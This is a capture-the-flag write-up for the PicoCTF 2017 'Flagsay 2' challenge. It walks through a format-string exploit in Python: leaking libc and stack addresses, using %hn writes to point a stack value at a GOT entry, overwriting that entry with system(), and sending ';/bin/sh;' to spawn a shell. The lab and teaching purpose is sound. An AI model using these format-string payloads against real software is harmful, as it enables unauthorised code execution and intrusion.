# PicoCTF2017_L4_flagsay2

Description:
```
Flagsay 2

Apparently I messed up using system(). I'm pretty sure this one is secure though! I hope flagsay-2 is just as exhilarating as the the first one! Source. Connect on shell2017.picoctf.com:18115.

HINTS
 The buffer isn't on the stack, so you can't use your own pointers. Is there another way to get a pointer?
 Make sure you know about using hn and $ in format strings
```
First things first. We need to leak a libc and stack address so we know what's where.

```python
     #First Leak a LIBC address
      print r.sendline("CAE: "+'%11$p')
      r.recvuntil("CAE: 0x")
      leak = r.recvuntil('/')[:-1].strip()
      libc_base = int(leak,16) - LIBC_OFFSET
 
      print "libc_base = %x " %(libc_base)
      libc.address = libc_base

      # Grab a stack leak. Need to use this to rewrite existing values on the stack
      # to point to other values on the Stack that will then be used to point to the GOT
      print r.sendline("CAE: "+'%9$p')
      r.recvuntil("CAE: 0x")
      leak_stack = int(r.recvuntil('/')[:-1].strip(),16)
      print "Stack leak: " + hex(leak_stack)
```

Next, I found a pointer on the stack that pointed to another place on the stack. Using lower 2Bytes of the leaked stack address to make it point where I needed it. Then update its value

```python
      # Grab the lower 16bits, since we can only write 16 bit vaules at a time
      valtowrite1 = (leak_stack & 0xFFFF) + 6
      print hex(valtowrite1)  

      # Found a value on the stack to abuse. overwrite its lower 16bits
      payload  = ''
      payload += "%{}c%17$hn".format(int(valtowrite1-0x85))
      print r.sendline(payload)
```
Now it's time to get a value on the stack to point to a GOT address that I want to overwrite:
```python
      # Break our planned GOT overwrite into 2 16bit values
      GOT_ADDR1 = (GOT_OVERWRITE & 0xFFFF)
      GOT_ADDR2 = GOT_OVERWRITE >> 16

      #Left commented out debug code used to figure out the offsets to subtract
      payload  = ''
      #payload += "%{}c%9$hn".format(int(0x4141-0x81))
      payload += "%{}c%9$hn".format(int(GOT_ADDR1-0x81))
      print r.sendline(payload)

      payload  = ''
      #payload += "%{}c%53$hn".format(int(0x4242-0x81))
      payload += "%{}c%53$hn".format(int(GOT_ADDR2-0x81))
      print r.sendline(payload)
```
The stack value is ready to go. Now to update it.

```python
      # With the two writes above, the GOT address to overwrite is programmed
      # into the 16th stack position. Overwrite the lower 16bits of the address and hope
      # that the alignment works ok
      LIBC_SYSTEM = (libc.symbols['system'] & 0xFFFF)
      payload  = ''
      payload += "%{}c%16$hn".format(int(LIBC_SYSTEM-0x81))
      print r.sendline(payload)

      # Since libc will be loaded at different addresses each time
      #  the first 2 bytes (16 bits) of the offset of the chosen GOT pointer
      #  may not be the same as our chosen system address. 
      # But eventually it will be, so keep trying
      print r.sendline(";/bin/sh;")
      print "libc system = %x " %(libc.symbols['system'])
      print "written:    = %x " %(LIBC_SYSTEM)
```

As the commented code states. The upper 16bits or 2Bytes of the address on the GOT hopefully align.
If they are the same as our `system()` address, then we'll get a shell. Otherwise the application will segfault.
Just keep trying until it is successful.

Full exploit code in the [exploit.py](exploit.py) file.
